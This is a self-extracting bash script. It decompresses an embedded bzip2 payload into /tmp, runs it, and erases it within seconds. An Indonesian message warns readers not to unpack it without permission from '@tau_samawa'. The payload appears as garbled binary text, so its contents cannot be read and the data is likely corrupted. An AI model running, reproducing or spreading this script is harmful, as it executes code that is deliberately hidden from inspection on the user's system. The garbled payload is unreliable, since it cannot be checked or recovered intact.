#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY/�� V��e����?�������@D@  P��n��m�]ډVRDOh=OS�	�A���OP�@dz�hd��Q���G���CF  �z�  =F�phѠh4L@dhd �d  0@Q54�� 42&���4�@�"������$��&�7��CM@��hF�cC*B�g�3s-m�����g�}�(a�.�ݶhR������D��[��d~8�)xx�(j7�a kk[�ʚ��h�6Ǔ|Lx�X.�����}�b������W�ʰ�!�Q�h?x:!#!���\f"D�|� ����b���@�1Dz�����n'x�hp�Q�Gr5�O��(��ʧ�Q��$[�W������E����'M�/Di�lڷr�y�w�	����A�Iu6�6�a�唄!B ]c )�8�ժt��W�q�"���j8Jآ[�A���1e���)�X~}t8)�&�Y"v�_c��1.ms4���.��")}؂	m@s	Cv�*T�
�M��F"s�X��o�Q�-k]{�ˏ}C���D�(&H;�?������N2��{��-� �C�S�lC
��f��I&��I'm}(��f=Y{V�eB!x��+�K�3l-������ mG������O�1�L�=`�E�=-'�<���7�(H�XYr�?l��	���O-���꩒H��! VA��8k4eW���n)��am��βX�3�*M��S�D��5z�$ڶ��4@��`��Rk[	dJު�b�R��C�>A�8aDw� ��Wc5H� 2UVE����A>%�F
!�b��\�m0Ui��|f-s��ٚ>��������A�@p�`Ƃ�DR�E�L�:>�چ��;�����������І��[�`%��K:�Ԡ4�H^�L���3�wC!���Zn$L˖"�9�"�_iTD� 3�A��~b�����;�I�XAd��<QO�`!�t�z�9G�=����-��[���~8�x'��7�=֔:����o�
 @B����K��Hl3Z��=�E�8�~��-}:�J$^kB��(i%Q�4�H|G��bd}��n��L�p�z�;;f[��%�4̝��Z�3�pH����<[���Y�5�����b�'>A���l�35��lB���� ¸��"���z���<�b�I Q�ɕ���P����Wt�R���(�y"�5��Ը-�B#T�D��!q��(*
p!��W�f�[ܭ� �`o e�{lF��Z4o�kР� xM���XQ4��e�P�("R�"�.�!T@�
�ASy�XR-(!�h(��JX"ڰA .T��R*�ܑN$�+ 